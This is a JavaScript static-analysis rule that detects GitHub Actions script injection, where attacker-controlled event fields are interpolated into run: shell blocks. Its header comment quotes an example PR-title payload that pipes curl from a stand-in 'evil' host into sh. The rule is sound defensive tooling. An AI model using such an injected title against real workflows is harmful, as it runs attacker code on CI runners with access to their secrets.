/**
 * Rule: github-actions-injection
 * Detects GitHub Actions script injection — an attacker-controlled `${{ github.event.* }}`
 * expression (issue/PR title or body, comment body, commit message, head_ref…)
 * interpolated directly into a `run:` shell block. The attacker sets the PR title to
 * `"; curl evil | sh #` and it executes on your runner, with access to your secrets.
 *
 * Scans .github/workflows/*.yml and flags the dangerous expressions ONLY inside run:
 * blocks — using them in env: (the safe pattern) is not flagged.
 */

/** @typedef {import('./types.js').Rule} Rule */

const WORKFLOW = /\.github\/workflows\/[^/]*\.ya?ml$/i;

// Attacker-controllable contexts that must never be interpolated into a shell.
const DANGEROUS =
  /\$\{\{\s*github\.(?:head_ref\b|event\.(?:issue|pull_request|comment|review|discussion)\.(?:title|body)\b|event\.pull_request\.head\.(?:ref|label)\b|event\.head_commit\.message\b)/i;

/** @type {Rule} */
export const githubActionsInjection = {
  id: 'github-actions-injection',
  name: 'GitHub Actions Script Injection',
  severity: 'critical',
  description: 'Detects attacker-controlled ${{ github.event.* }} values interpolated into a run: shell block — remote code execution on your CI runner.',

  check(file) {
    if (!WORKFLOW.test(file.relativePath)) return [];

    const findings = [];
    let runIndent = -1; // indent of the current run: block, or -1 if not in one

    const flag = (i, line) => {
      findings.push({
        ruleId: 'github-actions-injection',
        ruleName: 'GitHub Actions Script Injection',
        severity: 'critical',
        message: 'Attacker-controlled ${{ github.event.* }} value interpolated into a run: shell — someone sets the PR/issue title and it executes on your runner (with your secrets).',
        file: file.relativePath,
        line: i + 1,
        evidence: line.trim().slice(0, 120),
        fix: 'Never interpolate ${{ github.event.* }} into run:. Pass it through env and reference the shell variable, which is not re-parsed: `env:\\n  TITLE: ${{ github.event.pull_request.title }}\\nrun: echo "$TITLE"`.',
      });
    };

    for (let i = 0; i < file.lines.length; i++) {
      const line = file.lines[i];
      const trimmed = line.trim();
      if (trimmed === '') continue;
      const indent = line.length - line.trimStart().length;

      // Dedented back to/under the run: key → the block has ended.
      if (runIndent >= 0 && indent <= runIndent) runIndent = -1;

      const runMatch = /^(?:-\s*)?run:\s*(.*)$/.exec(trimmed);
      if (runMatch) {
        runIndent = indent;
        if (DANGEROUS.test(line)) flag(i, line); // inline `run: echo ${{ … }}`
        continue;
      }

      if (runIndent >= 0 && DANGEROUS.test(line)) flag(i, line); // inside the run block body
    }
    return findings;
  },
};
